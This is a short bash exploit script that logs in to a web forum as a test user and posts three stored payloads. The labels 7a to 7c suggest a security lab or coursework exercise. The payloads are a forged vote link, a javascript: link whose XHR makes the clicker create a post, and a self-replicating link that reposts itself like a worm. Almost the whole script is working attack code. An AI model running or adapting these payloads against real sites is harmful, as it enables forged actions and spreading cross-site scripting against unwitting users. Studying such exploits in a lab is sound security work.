#!/bin/bash

url="$1";

curl -i -c cookies.txt --data "username=alice&password=password123&form=login&submit=Login" "$url/post.php" >>response.txt
a="<a href='vote.php?id=2&vote=1000'>7a</a>"
curl -i -b cookies.txt --form-string "form=content" --form-string "content=$a" --form "title=alice's post" --form "type=1" --form "submit=Post" "$url/post.php" >> response.txt

js="const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );"
a="<a href=\"javascript:$js\">7b</a>"
curl -b cookies.txt --data "form=content&content=$a&title=you can create new post&type=1;" "$url/post.php" >>response.txt


a="<a id=1929 href=\"javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\\'javascript:document.getElementById(1929).click()\\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );\">7c</a>"
curl -b cookies.txt --data "form=content&content=$a&title=recursive post&type=1;" "$url/post.php" >>response.txt